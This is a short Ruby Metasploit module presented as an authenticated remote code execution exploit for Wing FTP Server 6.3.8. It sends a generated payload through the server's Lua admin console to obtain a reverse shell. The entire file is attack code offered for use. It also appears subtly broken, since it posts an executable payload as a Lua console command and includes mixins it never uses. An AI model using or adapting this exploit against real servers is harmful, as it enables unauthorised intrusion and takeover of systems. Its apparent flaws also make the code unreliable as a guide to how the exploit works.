require 'msf/core'
require 'net/http'

class MetasploitModule < Msf::Exploit

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::EXE
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient
	def initialize(info = {})
    		super(update_info(
      		info,
      		'Name'           => 'Wing FTP Server 6.3.8 - Remote Code Execution (Authenticated)',
      		'Description'    => %q{(Wing FTP Server have a web console based on Lua language. For authenticated users, this console can be exploited to obtaining a reverse shell. This exploit requires valid credentials on the target system)},
      		'Author'         =>
         	[
           	'Roberto Focke',
         	],
      		'License'        => MSF_LICENSE,
      	
    		))

	register_options(
      	[
		OptString.new('COOKIE', [ true,  "The cookie to authenticate"]),
		Opt::RPORT(5466),
	], self.class
	)
	end
	def exploit
		print_status("Executing the payload...")
		res=send_request_cgi(
		"uri"=>normalize_uri(target_uri.path,'admin_lua_.html?r=0.3592753444724336'),
		"method"=>"POST",
		"cookie"=>datastore["COOKIE"],
		'vars_post' => {
        	'command' => generate_payload_exe
      	}
	)
	end
end
